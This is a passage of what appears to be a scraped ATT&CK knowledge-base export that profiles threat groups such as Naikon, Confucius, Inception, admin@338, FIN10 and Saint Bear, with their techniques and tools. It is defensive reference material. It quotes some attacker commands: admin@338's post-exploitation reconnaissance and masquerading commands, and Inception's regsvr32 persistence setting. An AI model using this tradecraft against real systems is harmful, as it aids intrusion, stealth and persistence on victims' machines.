Scheduled Task/Job: Scheduled Task Naikon has used schtasks.exe for lateral movement in compromised networks.[4] Enterprise T1518 .001 Software Discovery: Security Software Discovery Naikon uses commands such as netsh advfirewall firewall to discover local firewall settings.[2] Enterprise T1016 System Network Configuration Discovery Naikon uses commands such as netsh interface show to discover network interface settings.[2] Enterprise T1204 .002 User Execution: Malicious File Naikon has convinced victims to open malicious attachments to execute malware.[5] Enterprise T1078 .002 Valid Accounts: Domain Accounts Naikon has used administrator credentials for lateral movement in compromised networks.[4] Enterprise T1047 Windows Management Instrumentation Naikon has used WMIC.exe for lateral movement.[4] Software ID Name References Techniques S0456 Aria-body [5][4] Access Token Manipulation: Create Process with Token, Access Token Manipulation: Token Impersonation/Theft, Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data from Removable Media, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery S0095 ftp [2] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0061 HDoor [2] Impair Defenses: Disable or Modify Tools, Network Service Discovery S0630 Nebulae [4] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Application Layer Protocol, Process Discovery, System Information Discovery S0039 Net [2][4] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh [2] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0097 Ping [2][4] Remote System Discovery S0029 PsExec [2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0629 RainyDay [4] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Fallback Channels, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Proxy, Scheduled Task/Job: Scheduled Task, Screen Capture, System Service Discovery S0055 RARSTONE [2][1] File and Directory Discovery, Ingress Tool Transfer, Non-Application Layer Protocol, Process Injection: Dynamic-link Library Injection S0058 SslMM [2][1] Access Token Manipulation, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Fallback Channels, Impair Defenses: Disable or Modify Tools, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, System Information Discovery, System Owner/User Discovery S0060 Sys10 [2] Application Layer Protocol: Web Protocols, Encrypted Channel: Symmetric Cryptography, Permission Groups Discovery: Local Groups, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0096 Systeminfo [2] System Information Discovery S0057 Tasklist [2] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0059 WinMM [2][1] Application Layer Protocol: Web Protocols, Fallback Channels, File and Directory Discovery, Process Discovery, System Information Discovery, System Owner/User Discovery References ThreatConnect Inc. and Defense Group Inc. (DGI). (2015, September 23). Project CameraShy: Closing the Aperture on China's Unit 78020. Retrieved December 17, 2015. Baumgartner, K., Golovkin, M.. (2015, May). The MsnMM Campaigns: The Earliest Naikon APT Campaigns. Retrieved April 10, 2019. Baumgartner, K., Golovkin, M.. (2015, May 14). The Naikon APT. Retrieved January 14, 2015. Vrabie, V. (2021, April 23). NAIKON \u2013 Traces from a Military Cyber-Espionage Operation. Retrieved June 29, 2021. CheckPoint. (2020, May 7). Naikon APT: Cyber Espionage Reloaded. Retrieved May 26, 2020. "
},
{
"id": 62,
"title": "Confucius, Confucius APT, Group G0142",
"path": "/groups/G0142/index.html",
"content": " Confucius Confucius is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between Confucius and Patchwork, particularly in their respective custom malware code and targets.[1][2][3] ID: G0142 \u24d8 Associated Groups: Confucius APT Version: 1.1 Created: 26 December 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services Confucius has obtained cloud storage service accounts to host stolen data.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Confucius has used HTTP for C2 communications.[3] Enterprise T1119 Automated Collection Confucius has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Confucius has dropped malicious files into the startup folder %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup on a compromised host in order to maintain persistence.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Confucius has used PowerShell to execute malicious files and payloads.[2] .005 Command and Scripting Interpreter: Visual Basic Confucius has used VBScript to execute malicious code.[1] Enterprise T1041 Exfiltration Over C2 Channel Confucius has exfiltrated stolen files to its C2 server.[2] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Confucius has exfiltrated victim data to cloud storage service accounts.[1] Enterprise T1203 Exploitation for Client Execution Confucius has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.[3][1] Enterprise T1083 File and Directory Discovery Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.[2] Enterprise T1105 Ingress Tool Transfer Confucius has downloaded additional files and payloads onto a compromised host following initial access.[3][2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Confucius has crafted and sent victims malicious attachments to gain initial access.[3] .002 Phishing: Spearphishing Link Confucius has sent malicious links to victims through email campaigns.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Confucius has created scheduled tasks to maintain persistence on a compromised host.[2] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Confucius has used mshta.exe to execute malicious VBScript.[1] Enterprise T1082 System Information Discovery Confucius has used a file stealer that can examine system drives, including those other than the C drive.[2] Enterprise T1221 Template Injection Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit.[3] Enterprise T1204 .001 User Execution: Malicious Link Confucius has lured victims into clicking on a malicious link sent through spearphishing.[2] .002 User Execution: Malicious File Confucius has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.[3] Software ID Name References Techniques S1077 Hornbill [4] Abuse Elevation Control Mechanism: Device Administrator Permissions, Access Notifications, Application Layer Protocol: Web Protocols, Audio Capture, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: User Evasion, Indicator Removal on Host: File Deletion, Location Tracking, Masquerading: Match Legitimate Name or Location, Protected User Data: Contact List, Protected User Data: Call Log, Screen Capture, Software Discovery, Stored Application Data, System Information Discovery, System Network Configuration Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery: Wi-Fi Discovery, Video Capture S1082 Sunbird [4] Abuse Elevation Control Mechanism: Device Administrator Permissions, Archive Collected Data, Audio Capture, Command and Scripting Interpreter: Unix Shell, Data from Local System, Exfiltration Over C2 Channel, Ingress Tool Transfer, Location Tracking, Protected User Data: Call Log, Protected User Data: Contact List, Protected User Data: Calendar Entries, Screen Capture, Software Discovery, Stored Application Data, System Information Discovery, System Network Configuration Discovery, Video Capture S0670 WarzoneRAT [5][3] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: VNC, Rootkit, System Information Discovery, Template Injection, User Execution: Malicious File, Video Capture References Lunghi, D and Horejsi, J. (2018, February 13). Deciphering Confucius: A Look at the Group's Cyberespionage Operations. Retrieved December 26, 2021. Lunghi, D. (2021, August 17). Confucius Uses Pegasus Spyware-related Lures to Target Pakistani Military. Retrieved December 26, 2021. Uptycs Threat Research Team. (2021, January 12). Confucius APT deploys Warzone RAT. Retrieved December 17, 2021. Apurva Kumar, Kristin Del Rosso. (2021, February 10). Novel Confucius APT Android Spyware Linked to India-Pakistan Conflict. Retrieved June 9, 2023. Harakhavik, Y. (2020, February 3). Warzone: Behind the enemy lines. Retrieved December 17, 2021. "
},
{
"id": 63,
"title": "Inception, Inception Framework, Cloud Atlas, Group G0100",
"path": "/groups/G0100/index.html",
"content": " Inception Inception is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.[1][2][3] ID: G0100 \u24d8 Associated Groups: Inception Framework, Cloud Atlas Contributors: Oleg Skulkin, Group-IB Version: 1.2 Created: 08 May 2020 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Inception Framework [2] Cloud Atlas [3] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Inception has used HTTP, HTTPS, and WebDav in network communications.[3][1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Inception has maintained persistence by modifying Registry run key value HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Inception has used PowerShell to execute malicious commands and payloads.[1][3] .005 Command and Scripting Interpreter: Visual Basic Inception has used VBScript to execute malicious commands and payloads.[1][3] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.[2] Enterprise T1005 Data from Local System Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.[4] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Inception has encrypted network communications with AES.[3] Enterprise T1203 Exploitation for Client Execution Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.[4][3][2][1] Enterprise T1083 File and Directory Discovery Inception used a file listing plugin to collect information about file and directories both on local and remote drives.[2] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.[3] Enterprise T1588 .002 Obtain Capabilities: Tool Inception has obtained and used open-source tools such as LaZagne.[4] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups Inception has used specific malware modules to gather domain membership.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.[3][2][1][4] Enterprise T1057 Process Discovery Inception has used a reconnaissance module to identify active processes and other associated loaded modules.[2] Enterprise T1090 .003 Proxy: Multi-hop Proxy Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers.[2] Enterprise T1518 Software Discovery Inception has enumerated installed software on compromised systems.[2] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Inception has used malicious HTA files to drop and execute malware.[4] .010 System Binary Proxy Execution: Regsvr32 Inception has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s.[3] Enterprise T1082 System Information Discovery Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.[2] Enterprise T1221 Template Injection Inception has used decoy documents to load malicious remote payloads via HTTP.[1] Enterprise T1204 .002 User Execution: Malicious File Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware.[3][4][2][1] Enterprise T1102 Web Service Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.[3][2] Software ID Name References Techniques S0349 LaZagne [4] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0441 PowerShower [1] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Data Encoding: Standard Encoding, Exfiltration Over C2 Channel, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Modify Registry, Process Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0442 VBShower [4] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Indicator Removal: File Deletion, Ingress Tool Transfer References Lancaster, T. (2018, November 5). Inception Attackers Target Europe with Year-old Office Vulnerability. Retrieved May 8, 2020. Symantec. (2018, March 14). Inception Framework: Alive and Well, and Hiding Behind Proxies. Retrieved May 8, 2020. GReAT. (2014, December 10). Cloud Atlas: RedOctober APT is back in style. Retrieved May 8, 2020. GReAT. (2019, August 12). Recent Cloud Atlas activity. Retrieved May 8, 2020. "
},
{
"id": 64,
"title": "admin@338, Group G0018",
"path": "/groups/G0018/index.html",
"content": " admin@338 admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as PoisonIvy, as well as some non-public backdoors. [1] ID: G0018 Contributors: Tatsuya Daitoku, Cyber Defense Institute, Inc. Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer.[1] Enterprise T1203 Exploitation for Client Execution admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.[1] Enterprise T1083 File and Directory Discovery admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location admin@338 actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: net localgroup administrator >> %temp%\\download[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment admin@338 has sent emails with malicious Microsoft Office documents attached.[1] Enterprise T1082 System Information Discovery admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download[1] Enterprise T1016 System Network Configuration Discovery admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download[1] Enterprise T1049 System Network Connections Discovery admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%\\download[1] Enterprise T1007 System Service Discovery admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%\\download[1] Enterprise T1204 .002 User Execution: Malicious File admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.[1] Software ID Name References Techniques S0043 BUBBLEWRAP [1] Application Layer Protocol: Web Protocols, Non-Application Layer Protocol, System Information Discovery S0100 ipconfig [1] System Network Configuration Discovery S0042 LOWBALL [1] Application Layer Protocol: Web Protocols, Ingress Tool Transfer, Web Service: Bidirectional Communication S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [1] System Network Connections Discovery S0012 PoisonIvy [1] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0096 Systeminfo [1] System Information Discovery References FireEye Threat Intelligence. (2015, December 1). China-based Cyber Threat Group Uses Dropbox for Malware Communications and Targets Hong Kong Media Outlets. Retrieved December 4, 2015. "
},
{
"id": 65,
"title": "FIN10, Group G0051",
"path": "/groups/G0051/index.html",
"content": " FIN10 FIN10 is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. [1] ID: G0051 Version: 1.3 Created: 14 December 2017 Last Modified: 17 November 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.[1][2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.[1][2] .003 Command and Scripting Interpreter: Windows Command Shell FIN10 has executed malicious .bat files containing PowerShell commands.[1] Enterprise T1070 .004 Indicator Removal: File Deletion FIN10 has used batch scripts and scheduled tasks to delete critical system files.[1] Enterprise T1570 Lateral Tool Transfer FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[1] Enterprise T1588 .002 Obtain Capabilities: Tool FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol FIN10 has used RDP to move laterally to systems in the victim environment.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.[1][2] Enterprise T1033 System Owner/User Discovery FIN10 has used Meterpreter to enumerate users on remote systems.[1] Enterprise T1078 Valid Accounts FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[1] .003 Local Accounts FIN10 has moved laterally using the Local Administrator account.[1] Software ID Name References Techniques S0363 Empire [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation References FireEye iSIGHT Intelligence. (2017, June 16). FIN10: Anatomy of a Cyber Extortion Operation. Retrieved November 17, 2024. Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. "
},
{
"id": 66,
"title": "Saint Bear, Storm-0587, TA471, UAC-0056, Lorec53, Group G1031",
"path": "/groups/G1031/index.html",
"content": " Saint Bear Saint Bear is a Russian-nexus threat actor active since early 2021, primarily targeting entities in Ukraine and Georgia. The group is notable for a specific remote access tool, Saint Bot, and information stealer, OutSteel in campaigns. Saint Bear typically relies on phishing or web staging of malicious documents and related file types for initial access, spoofing government or related entities.[1][2] Saint Bear has previously been confused with Ember Bear operations, but analysis of behaviors, tools, and targeting indicates these are distinct clusters. ID: G1031 \u24d8 Associated Groups: Storm-0587, TA471, UAC-0056, Lorec53 Version: 1.0 Created: 25 May 2024 Last Modified: 12 August 2024 Version Permalink Live Version Associated Group Descriptions Name Description Storm-0587 [2] TA471 [1] UAC-0056 [1] Lorec53 [1] Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services Saint Bear has leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations.[1] Enterprise T1059 Command and Scripting Interpreter Saint Bear has used the Windows Script Host (wscript) to execute intermediate files written to victim machines.[1] .001 PowerShell Saint Bear relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads.[1] .003 Windows Command Shell Saint Bear initial loaders will also drop a malicious Windows batch file, available via open source GitHub repositories, that disables Microsoft Defender functionality.[1] .007 JavaScript Saint Bear has delivered malicious Microsoft Office files containing an embedded JavaScript object that would, on execution, download and execute OutSteel and Saint Bot.[1] Enterprise T1203 Exploitation for Client Execution Saint Bear has leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Saint Bear gathered victim email information in advance of phishing operations for targeted attacks.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Saint Bear will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality.[1] Enterprise T1656 Impersonation Saint Bear has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources.[2] Enterprise T1112 Modify Registry Saint Bear will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Saint Bear clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File Saint Bear initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Saint Bear uses a variety of file formats, such as Microsoft Office documents, ZIP archives, PDF documents, and other items as phishing attachments for initial access.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware Saint Bear has used the Discord content delivery network for hosting malicious content referenced in links and emails.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Saint Bear has used an initial loader malware featuring a legitimate code signing certificate associated with \"Electrum Technologies GmbH.\"[1] Enterprise T1204 .001 User Execution: Malicious Link Saint Bear has, in addition to email-based phishing attachments, used malicious websites masquerading as legitimate entities to host links to malicious files for user execution.[1][2] .002 User Execution: Malicious File Saint Bear relies on user interaction and execution of malicious attachments and similar for initial execution on victim systems.[1] Enterprise T1497 Virtualization/Sandbox Evasion Saint Bear contains several anti-analysis and anti-virtualization checks.[1] Software ID Name References Techniques S1017 OutSteel OutSteel is uniquely associated with Saint Bear as a post-exploitation document collection and exfiltration tool.[1] Application Layer Protocol: Web Protocols, Automated Collection, Automated Exfiltration, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: AutoHotKey & AutoIT, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, User Execution: Malicious Link, User Execution: Malicious File S1018 Saint Bot Saint Bot is closely correlated with Saint Bear operations as a common post-exploitation toolset.[1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, File and Directory Discovery, Hijack Execution Flow, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Asynchronous Procedure Call, Process Injection: Process Hollowing, Query Registry, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: InstallUtil, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File, User Execution: Malicious Link, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks References Unit 42. (2022, February 25). Spear Phishing Attacks Target Organizations in Ukraine, Payloads Include the Document Stealer OutSteel and the Downloader SaintBot. Retrieved June 9, 2022. Microsoft Threat Intelligence. (2023, June 14). Cadet Blizzard emerges as a novel and distinct Russian threat actor. Retrieved July 10, 2023. "
},
{
"id": 67,
"title": "Ajax Security Team, Operation Woolen-Goldfish, AjaxTM, Rocket Kitten, Flying Kitten, Operation Saffron Rose, Group G0130",
"path": "/groups/G0130/index.html",
"content": " Ajax Security Team Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.[1] ID: G0130 \u24d8 Associated Groups: Operation Woolen-Goldfish, AjaxTM, Rocket Kitten, Flying Kitten, Operation Saffron Rose Version: 1.0 Created: 14 April 2021 Last Modified: 09 October 2023 Version Permalink Live Version Associated Group Descriptions Name Description Operation Woolen-Goldfish Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between Ajax Security Team and the campaign Operation Woolen-Goldfish.[2][3] AjaxTM [1] Rocket Kitten Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between Ajax Security Team and Rocket Kitten.[2][4] Flying Kitten [5] Operation Saffron Rose [1] Techniques Used Domain ID Name Use Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.[2] Enterprise T1105 Ingress Tool Transfer Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.[2] Enterprise T1056 .001 Input Capture: Keylogging Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Ajax Security Team has used personalized spearphishing attachments.[2] .003 Phishing: Spearphishing via Service Ajax Security Team has used various social media channels to 